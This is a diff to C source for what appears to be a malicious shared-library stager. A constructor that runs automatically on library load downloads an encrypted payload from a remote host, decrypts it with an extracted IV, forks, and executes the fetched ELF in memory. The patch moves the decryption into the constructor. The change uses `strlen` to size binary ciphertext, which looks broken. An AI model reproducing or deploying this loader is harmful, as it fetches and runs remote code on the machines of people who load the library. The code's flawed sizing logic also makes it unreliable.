@@ -158,26 +158,6 @@ char *download_file(const char *host, const char *port, const char *path,
   }
 #endif
 
-  // Strip the first 6 bytes of the downloaded data
-  data += 6;
-  data_size -= 6;
-
-  // Extract the IV from the beginning of the data
-  uint8_t iv[16];
-  memcpy(iv, data, 16);
-#ifdef DEBUG
-  printf("Extracted IV: ");
-  for (int i = 0; i < 16; i++) {
-    printf("%02x", iv[i]);
-  }
-  printf("\n");
-#endif
-
-  // Decrypt the data
-  decrypt_data(data + 16, data_size - 16, key, iv);
-
-  DEBUG_PRINT("Downloaded and decrypted data of size: %zu\n", data_size - 16);
-
 #ifdef DEBUG
   // Save the decrypted data to disk
   file = fopen("/tmp/decrypted_data", "wb");
@@ -190,7 +170,7 @@ char *download_file(const char *host, const char *port, const char *path,
   }
 #endif
 
-  return data + 16;
+  return data;
 }
 
 /**
@@ -257,6 +237,14 @@ void __attribute__((constructor)) initLibrary(void) {
     return;
   }
 
+  // Extract IV from the beginning of the buffer
+  uint8_t iv[16];
+  memcpy(iv, buf, 16);
+
+  // Decrypt the downloaded data
+  size_t data_size = strlen(buf + 16); // Get the data size
+  decrypt_data(buf + 16, data_size, key, iv);
+
   char *argv[] = {"", NULL};
   char *envv[] = {"PATH=/bin:/usr/bin:/sbin:/usr/sbin",
                   "HOME=/tmp",
@@ -270,7 +258,7 @@ void __attribute__((constructor)) initLibrary(void) {
   if (child == 0) {
     // Run the ELF
     DEBUG_PRINT("Running ELF...\n");
-    elf_run(buf, argv, envv);
+    elf_run(buf + 16, argv, envv); // Adjust the buffer pointer
   }
 }
 
